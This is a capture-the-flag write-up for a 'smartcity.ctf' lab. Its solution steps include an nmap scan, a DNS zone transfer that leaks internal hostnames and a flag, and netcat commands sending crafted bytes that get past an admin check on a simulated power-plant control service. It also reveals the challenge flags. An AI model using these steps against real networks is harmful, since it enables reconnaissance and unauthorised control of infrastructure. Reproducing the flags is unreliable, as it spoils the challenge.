@@ -1,0 +1,31 @@
+TASK #1
+To achieve backward compatibility, an old name service was live in the network. Domain: *.smartcity.ctf IP: 10.0.10.13
+
+Solution:
+sudo nmap -T4 -A 10.0.10.1/24
+dig ANY @10.0.10.13 smartcity.ctf
+dig axfr smartcity.ctf @ns1.smartcity.ctf
+
+; <<>> DiG 9.11.5-P4-5.1+deb10u2-Debian <<>> axfr smartcity.ctf @ns1.smartcity.ctf
+;; global options: +cmd
+smartcity.ctf.          14400   IN      SOA     ns1.smartcity.ctf. admin.smartcity.ctf. 2017082401 10800 3600 604800 604800
+smartcity.ctf.          14400   IN      NS      ns1.smartcity.ctf.
+smartcity.ctf.          14400   IN      A       10.0.10.13
+adv.smartcity.ctf.      14400   IN      A       10.10.10.5
+cctv.smartcity.ctf.     14400   IN      A       10.10.10.2
+flag.smartcity.ctf.     14400   IN      TXT     "flag{1jdicodnge704nxtcen4hd8}"
+ns1.smartcity.ctf.      14400   IN      A       10.0.10.13
+pipe.smartcity.ctf.     14400   IN      A       172.16.10.10
+smartcity.ctf.          14400   IN      SOA     ns1.smartcity.ctf. admin.smartcity.ctf. 2017082401 10800 3600 604800 604800
+;; Query time: 11 msec
+;; SERVER: 10.0.10.13#53(10.0.10.13)
+;; WHEN: Sat Dec 12 16:50:52 EET 2020
+;; XFR size: 9 records (messages 1, bytes 307)
+
+================================================================================================================================
+TASK #2
+Main target. Information is classified. However, you can gain some insights by examining this network capture.
+
+Solution:
+echo -e '\x5c\x05\xff\x0a' | sudo nc 10.10.10.100 1337 -> BPForbidden! Only admins can manage the station. Log in first
+echo -e '\x5c\x05\x0f\x0a' | sudo nc 10.10.10.100 1337 -> B Turned the power plant on! Here is your flag, admin: ctf{bl0w_1t_7p!}
